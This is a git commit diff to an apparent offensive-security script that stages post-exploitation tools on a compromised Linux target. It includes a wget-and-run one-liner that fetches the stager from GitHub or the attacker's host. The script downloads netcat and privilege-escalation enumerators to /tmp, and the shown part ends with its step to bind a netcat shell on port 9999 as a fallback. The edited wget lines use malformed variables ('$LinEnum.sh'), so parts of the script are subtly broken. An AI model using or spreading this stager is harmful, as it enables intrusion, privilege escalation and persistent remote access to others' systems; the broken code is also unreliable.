c8728bd9c7e27e5c2c22c2f46be7d62937df1ae7
WillChaos <46702070+WillChaos@users.noreply.github.com>
2019-03-02 18:59:16 +0800

    Update LinuxStager.sh

--- PrivEsc/LinuxStager.sh
+++ PrivEsc/LinuxStager.sh
@@ -1,8 +1,21 @@
 #!/bin/bash
 # used to stage all appropriate tools needed for privesc + handles some base config setup
-# use: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh
+# -------------------------------------------------------------------------------------------------------------------------------- 
+# if the target is able to contact github, use the below one liner for the quickest method.
+# cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/
+#
+# if the target is only able to connect back to you download, use the below
+# host machine: wget files
+# host machine python -m SimpleHttpServer 6666
+# Target machine: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh
+# ---------------------------------------------------------------------------------------------------------------------------------
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
+if [ -z "$1" ]
+  then
+    echo "select file source, IE: https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/"
+    echo "NOTE: make sure you include the trailing: / " 
+  else
 
 # banner
 echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
@@ -10,17 +23,17 @@ echo "[]________________________________________________________________________
 
 # download NC
 echo "[*] Downloading NC to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -O /tmp/nc && chmod +x /tmp/nc
+wget $1nc -O /tmp/nc && chmod +x /tmp/nc
 
 
 # download linenum.sh
 echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
+wget $LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
 
 
 # download LinxPrivChecker.py
 echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -O /tmp/LPC.py
+wget $linuxprivchecker.py -O /tmp/LPC.py
 
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
